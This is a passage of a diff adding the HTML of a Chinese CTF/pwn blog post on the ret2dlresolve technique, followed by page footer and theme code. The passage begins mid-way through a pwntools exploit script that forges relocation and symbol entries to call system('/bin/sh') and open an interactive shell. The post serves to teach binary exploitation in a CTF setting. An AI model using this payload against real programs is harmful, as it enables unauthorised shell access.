+</span></span><span class="line"><span class="cl"><span class="n">payload</span> <span class="o">+=</span> <span class="n">p32</span><span class="p">(</span><span class="n">plt_0</span><span class="p">)</span>   <span class="c1"># push link_map;jmp dl_runtime_resolve</span>
+</span></span><span class="line"><span class="cl"><span class="n">payload</span> <span class="o">+=</span> <span class="n">p32</span><span class="p">(</span><span class="n">fake_reloc</span><span class="p">)</span>  <span class="c1"># reloc_arg</span>
+</span></span><span class="line"><span class="cl"><span class="n">payload</span> <span class="o">+=</span> <span class="n">p32</span><span class="p">(</span><span class="mh">0xdead</span><span class="p">)</span>    <span class="c1"># retn addr</span>
+</span></span><span class="line"><span class="cl"><span class="n">payload</span> <span class="o">+=</span> <span class="n">p32</span><span class="p">(</span><span class="n">base_stage</span> <span class="o">+</span> <span class="mi">80</span><span class="p">)</span>   <span class="c1"># system arg </span>
+</span></span><span class="line"><span class="cl"><span class="n">payload</span> <span class="o">+=</span> <span class="sa">b</span><span class="s1">&#39;AAAA&#39;</span> <span class="c1"># base_stage + 20</span>
+</span></span><span class="line"><span class="cl"><span class="n">payload</span> <span class="o">+=</span> <span class="sa">b</span><span class="s1">&#39;AAAA&#39;</span> <span class="c1"># base_stage + 24</span>
+</span></span><span class="line"><span class="cl"><span class="n">payload</span> <span class="o">+=</span> <span class="n">fake_rel</span> <span class="c1"># fake .rel.plt base_stage + 28 (8 bytes)</span>
+</span></span><span class="line"><span class="cl"><span class="n">payload</span> <span class="o">+=</span> <span class="n">alg</span> <span class="o">*</span> <span class="sa">b</span><span class="s1">&#39;A&#39;</span>   <span class="c1"># base_stage + 36</span>
+</span></span><span class="line"><span class="cl"><span class="n">payload</span> <span class="o">+=</span> <span class="n">fake_sym</span> <span class="c1"># fake .dynsym base_stage + 36 + algin (16 bytes)</span>
+</span></span><span class="line"><span class="cl"><span class="n">payload</span> <span class="o">+=</span> <span class="sa">b</span><span class="s1">&#39;system</span><span class="se">\x00</span><span class="s1">&#39;</span> <span class="c1"># fake st_name base_stage + 36 + algin + 0x10 (6 bytes)</span>
+</span></span><span class="line"><span class="cl"><span class="n">payload</span> <span class="o">+=</span> <span class="sa">b</span><span class="s1">&#39;A&#39;</span> <span class="o">*</span> <span class="p">(</span><span class="mi">80</span> <span class="o">-</span> <span class="nb">len</span><span class="p">(</span><span class="n">payload</span><span class="p">))</span>
+</span></span><span class="line"><span class="cl"><span class="n">payload</span> <span class="o">+=</span> <span class="n">bin_sh</span>   <span class="c1"># base_stage + 80</span>
+</span></span><span class="line"><span class="cl"><span class="n">payload</span> <span class="o">+=</span> <span class="sa">b</span><span class="s1">&#39;A&#39;</span> <span class="o">*</span> <span class="p">(</span><span class="mi">100</span> <span class="o">-</span> <span class="nb">len</span><span class="p">(</span><span class="n">payload</span><span class="p">))</span>  <span class="c1"># read(0,base_stage,100)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">r</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">r</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span></span></span></code></pre></td></tr></table>
+</div>
+</div></div><div class="post-footer" id="post-footer">
+  <div class="post-info">
+    <div class="post-info-line">
+      <div class="post-info-mod">
+        <span title="更新于 2023-11-03 16:07:37">更新于 2023-11-03&nbsp;</span>
+      </div><div class="post-info-license">
+          <span><a rel="license external nofollow noopener noreferrer" href="https://creativecommons.org/licenses/by-nc/4.0/" target="_blank">CC BY-NC 4.0</a></span>
+        </div></div>
+    <div class="post-info-line">
+      <div class="post-info-md"><span><a href="/articles/2023/11/advancerop-ret2dlresolve/index.md" title="阅读原始文档" class="link-to-markdown">阅读原始文档</a></span></div>
+      <div class="post-info-share">
+        <span><a href="javascript:void(0);" title="分享到 Twitter" data-sharer="twitter" data-url="https://alextang.top/articles/2023/11/advancerop-ret2dlresolve/" data-title="AdvanceROP-ret2dlresolve" data-via="a1extang" data-hashtags="CTF,Pwn,二进制"><i class="fa-brands fa-twitter fa-fw" aria-hidden="true"></i></a>
+  <a href="javascript:void(0);" title="分享到 Facebook" data-sharer="facebook" data-url="https://alextang.top/articles/2023/11/advancerop-ret2dlresolve/" data-hashtag="CTF"><i class="fa-brands fa-facebook-square fa-fw" aria-hidden="true"></i></a>
+  <a href="javascript:void(0);" title="分享到 微博" data-sharer="weibo" data-url="https://alextang.top/articles/2023/11/advancerop-ret2dlresolve/" data-title="AdvanceROP-ret2dlresolve"><i class="fa-brands fa-weibo fa-fw" aria-hidden="true"></i></a>
+  </span>
+      </div>
+    </div>
+  </div>
+
+  <div class="post-info-more">
+    <section class="post-tags"><i class="fa-solid fa-tags fa-fw me-1" aria-hidden="true"></i><a href='/tags/ctf/' class="post-tag">CTF</a><a href='/tags/pwn/' class="post-tag">Pwn</a><a href='/tags/%E4%BA%8C%E8%BF%9B%E5%88%B6/' class="post-tag">二进制</a></section>
+    <section>
+      <span><a href="javascript:void(0);" onclick="window.history.back();">返回</a></span>&nbsp;|&nbsp;<span><a href="/">主页</a></span>
+    </section>
+  </div>
+
+  <div class="post-nav"><a href="/articles/2023/11/rop-brop/" class="post-nav-item" rel="prev" title="ROP-BROP"><i class="fa-solid fa-angle-left fa-fw" aria-hidden="true"></i>ROP-BROP</a>
+      <a href="/articles/2023/11/pcb2023/" class="post-nav-item" rel="next" title="鹏城杯2023WriteUp-Pwn">鹏城杯2023WriteUp-Pwn<i class="fa-solid fa-angle-right fa-fw" aria-hidden="true"></i></a></div>
+</div>
+</article></main><footer class="footer">
+    <div class="footer-container"><div class="footer-line copyright" itemscope itemtype="http://schema.org/CreativeWork"><i class="fa-regular fa-copyright fa-fw" aria-hidden="true"></i>
+            <span itemprop="copyrightYear">2024</span><span class="author" itemprop="copyrightHolder">
+              <a href="/">alextang</a></span><span class="license footer-divider"><a rel="license external nofollow noopener noreferrer" href="https://creativecommons.org/licenses/by-nc/4.0/" target="_blank">CC BY-NC 4.0</a></span></div><div class="footer-line statistics"></div><div class="footer-line visitor">
+          <span id="busuanzi_container_site_uv" title='总访客数'><i class="fa-regular fa-user fa-fw" aria-hidden="true"></i>&nbsp;<span id="busuanzi_value_site_uv"><i class="fa-solid fa-spinner fa-spin fa-fw" aria-hidden="true"></i></span></span><span id="busuanzi_container_site_pv" class="footer-divider" title='总访问量'><i class="fa-regular fa-eye fa-fw" aria-hidden="true"></i>&nbsp;<span id="busuanzi_value_site_pv"><i class="fa-solid fa-spinner fa-spin fa-fw" aria-hidden="true"></i></span></span>
+        </div><div class="footer-line beian"><span class="icp footer-divider"><a href="https://icp.gov.moe/?keyword=20238299" target="_blank">萌ICP备20238299号</a></span></div></div>
+  </footer></div><div class="widgets"><div class="fixed-buttons animate__faster d-none"><div class="fixed-button back-to-top" role="button" aria-label="回到顶部"><i class="fa-solid fa-arrow-up fa-fw" aria-hidden="true"></i><span class="variant-numeric d-none">0%</span>
+        </div></div><div id="mask"></div><noscript>
+    <div class="noscript-warning">FixIt 主题在启用 JavaScript 的情况下效果最佳。</div>
+  </noscript>
+</div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/katex@0.16.9/dist/katex.min.css"><script src="https://cdn.jsdelivr.net/npm/autocomplete.js@0.38.1/dist/autocomplete.min.js" defer></script><script src="https://cdn.jsdelivr.net/npm/lunr@2.3.9/lunr.min.js" defer></script><script src="/lib/lunr/lunr.stemmer.support.min.js" defer></script><script src="/lib/lunr/lunr.zh.min.js" defer></script><script src="https://cdn.jsdelivr.net/npm/sharer.js@0.5.1/sharer.min.js" async defer></script><script src="https://cdn.jsdelivr.net/npm/katex@0.16.9/dist/katex.min.js" defer></script><script src="https://cdn.jsdelivr.net/npm/katex@0.16.9/dist/contrib/auto-render.min.js" defer></script><script src="https://cdn.jsdelivr.net/npm/katex@0.16.9/dist/contrib/copy-tex.min.js" defer></script><script src="https://cdn.jsdelivr.net/npm/katex@0.16.9/dist/contrib/mhchem.min.js" defer></script><script src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js" async defer></script><script>window.config={"code":{"copyTitle":"复制到剪贴板","editLockTitle":"锁定可编辑代码块","editUnLockTitle":"解锁可编辑代码块","editable":true,"maxShownLines":10},"comment":{"enable":false},"math":{"delimiters":[{"display":true,"left":"$$","right":"$$"},{"display":true,"left":"\\[","right":"\\]"},{"display":true,"left":"\\begin{equation}","right":"\\end{equation}"},{"display":true,"left":"\\begin{equation*}","right":"\\end{equation*}"},{"display":true,"left":"\\begin{align}","right":"\\end{align}"},{"display":true,"left":"\\begin{align*}","right":"\\end{align*}"},{"display":true,"left":"\\begin{alignat}","right":"\\end{alignat}"},{"display":true,"left":"\\begin{alignat*}","right":"\\end{alignat*}"},{"display":true,"left":"\\begin{gather}","right":"\\end{gather}"},{"display":true,"left":"\\begin{CD}","right":"\\end{CD}"},{"display":false,"left":"$","right":"$"},{"display":false,"left":"\\(","right":"\\)"}],"strict":false},"search":{"highlightTag":"em","lunrIndexURL":"/index.json","lunrLanguageCode":"zh","lunrSegmentitURL":"/lib/lunr/lunr.segmentit.js","maxResultLength":10,"noResultsFound":"没有找到结果","snippetLength":50,"type":"lunr"}};</script><script src="/js/theme.min.js" defer></script></body>
+</html>
